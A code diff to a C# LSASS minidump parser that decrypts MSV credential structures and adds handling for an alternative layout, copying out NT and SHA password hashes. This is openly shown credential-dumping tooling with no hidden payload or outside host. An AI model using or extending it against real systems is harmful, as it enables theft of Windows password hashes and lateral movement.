@@ -4,6 +4,7 @@ using System;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using static Minidump.Decryptor.LogonSessions;
 using static Minidump.Helpers;
 
 namespace Minidump.Decryptor
@@ -13,7 +14,7 @@ namespace Minidump.Decryptor
         public const int LM_NTLM_HASH_LENGTH = 16;
         public const int SHA_DIGEST_LENGTH = 20;
 
-        public static int FindCredentials(Program.MiniDump minidump, msv.MsvTemplate template)
+        public static int FindCredentials(Parser.MiniDump minidump, msv.MsvTemplate template)
         {
             //PrintProperties(template);
 
@@ -39,7 +40,7 @@ namespace Minidump.Decryptor
                         var pPrimaryCredentials = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials"));
                         var pNext = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next"));
 
-                        lsasscred = Rva2offset(minidump, pPrimaryCredentials);
+                        lsasscred = Rva2offset(minidump, pPrimaryCredentials);  
                         while (lsasscred != 0)
                         {
                             minidump.fileBinaryReader.BaseStream.Seek(lsasscred, 0);
@@ -55,6 +56,30 @@ namespace Minidump.Decryptor
                                 byte[] msvCredentialsBytes = minidump.fileBinaryReader.ReadBytes(primaryCredentials.Credentials.MaximumLength);
 
                                 var msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, minidump.lsakeys);
+
+                                bool isStrangeCredential = msvDecryptedCredentialsBytes.Length ==  Marshal.SizeOf(typeof(MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC)) && msvDecryptedCredentialsBytes.Length >= 8 && msvDecryptedCredentialsBytes[4] == 0xCC && msvDecryptedCredentialsBytes[5] == 0xCC && msvDecryptedCredentialsBytes[6] == 0xCC && msvDecryptedCredentialsBytes[7] == 0xCC;
+
+                                if (isStrangeCredential)
+                                {
+                                    var strangeCred =  ReadStruct<MSV1_0_PRIMARY_CREDENTIAL_STRANGE_DEC>(msvDecryptedCredentialsBytes);
+
+                                    // NT hash
+                                    byte[] ntHash = new byte[16];
+                                    byte[] shaHash = new byte[20];
+
+                                    unsafe
+                                    {
+                                        for (int i = 0; i < 16; i++)
+                                            ntHash[i] = strangeCred.NtOwfPassword[i];
+
+                                        for (int i = 0; i < 20; i++)
+                                            shaHash[i] = strangeCred.ShaOwPassword[i];
+                                    }
+
+                                    Console.WriteLine(
+                                        $"[+] Strange credential structure detected"
+                                    );
+                                }
 
                                 var usLogonDomainName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.LogonDomainNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                                 var usUserName = ReadStruct<UNICODE_STRING>(GetBytes(msvDecryptedCredentialsBytes, template.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
